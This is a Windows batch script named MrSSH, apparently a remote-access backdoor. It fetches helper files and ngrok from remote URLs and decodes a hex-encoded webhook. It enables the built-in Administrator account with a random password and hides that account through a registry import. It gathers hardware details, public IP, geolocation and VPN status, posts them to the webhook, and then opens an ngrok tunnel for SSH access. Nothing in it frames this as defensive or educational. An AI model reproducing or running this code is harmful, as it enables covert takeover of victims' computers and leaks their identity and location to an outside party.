@echo on
setlocal enabledelayedexpansion
chcp 65001 >nul

:: <Variables>
set "Token=%~1"
set "Version=1.0"
set "DefaultToken=dheb"
set Files=NgrokRun.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
set "Folder=!temp!\Files" & IF NOT EXIST !Folder! mkdir !Folder!
set "TFolder=!temp!\TempFolder" & IF NOT EXIST !TFolder! mkdir !TFolder!
set "Data=%appdata%\MrSSH" & IF NOT EXIST !Data! mkdir !Data!
set "TaskFile=%appdata%\MrSSH\MrSSH-task.xml"
:: </Variables>

pushd !Folder!

:: <Token Check>
if not defined Token set "Token=!DefaultToken!"
curl -L# "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "!Folder!\Redirect.ini"
find /c "!token!" redirect.ini >NUL
if %errorlevel% equ 1 goto notfound
goto found
:notfound
echo TokenExists: False>!TFolder!\TokenCheck.txt
exit
:found
if !Token!==!DefaultToken! (echo TokenExists: Didn't specify>!TFolder!\TokenCheck.txt) else (echo TokenExists: True>!TFolder!\TokenCheck.txt)
:: </Token Check>

:: <Set webhook>
FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
set "hexwebhook=%hexwebhook:~-244%"
echo !hexwebhook!>HexString.hex
certutil -decodehex HexString.hex output.hex >nul
set /p webhook=<output.hex
del HexString.hex output.hex
:: </Set webhook>

:: <Install>
Rem download ngrok anyway, because it often bugs
curl -L# "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"

for %%a in (!Files!) do if not exist "!temp!\Files\%%a" set /a MissingFiles+=1

if !MissingFiles! geq 1 (
    for %%a in (!Files!) do (
        set /a Downloaded+=1
        curl --create-dirs -f#kLo "!temp!\Files\%%a" "!Github!/%%a"
    )
)
:: </Install>

powershell ./OpenSSH.ps1

:: <Create Administrator account, hide it and set strong rndm password for it>
set "set[1]=ABCDEFGHIJKLMNOPQRSTUVWXYZ"  &  set "len[1]=26"  &  set "num[1]=0"
set "set[2]=abcdefghijklmnopqrstuvwxyz"  &  set "len[2]=26"  &  set "num[2]=0"
set "set[3]=0123456789"                  &  set "len[3]=10"  &  set "num[3]=0"
set "set[4]=!@#$"                     &  set "len[4]=6"   &  set "num[4]=0"

set "list="
for /L %%i in (1,1,10) do (
   set /A rnd=!random! %% 4 + 1
   set "list=!list!!rnd! "
   set /A num[!rnd!]+=1
)

:checkList
set /A mul=num[1]*num[2]*num[3]*num[4]
if %mul% neq 0 goto listOK

   set /A num[%list:~0,1%]-=1
   set "list=%list:~2%"
   set /A rnd=%random% %% 4 + 1
   set "list=%list%%rnd% "
   set /A num[%rnd%]+=1

goto checkList
:listOK

set "RndAlphaNum="
for %%a in (%list%) do (
   set /A rnd=!random! %% len[%%a]
   for %%r in (!rnd!) do set "RndAlphaNum=!RndAlphaNum!!set[%%a]:~%%r,1!"
)

echo !RndAlphaNum!>%temp%\TempFolder\pass.txt

net user administrator /active:yes
net user "Administrator" "!RndAlphaNum!"

reg import "!Folder!\hide.reg"
:: </Create Administrator account, hide it and set strong rndm password for it>

:: <Get Network and Hardware>
for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
:: </Get Network and Hardware>

:: <Check for VPN>
if "!proxy!"=="false" (
    set "VPN=:red_circle:" && set "VPNi=OFF"
) else set "VPN=:green_circle:" && set "VPNi=ON - :warning: Some Information may be incorrect"
:: </Check for VPN>

call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n%VPN% **VPN:** %VPNi% \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**PC Specification**__\\n\\n:floppy_disk: **RAM:** %RAM%\\n\\n:nut_and_bolt: **CPU:** %CPU%\\n\\n:joystick: **GPU:** %GPU%\\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"

call NgrokRun.bat !token!
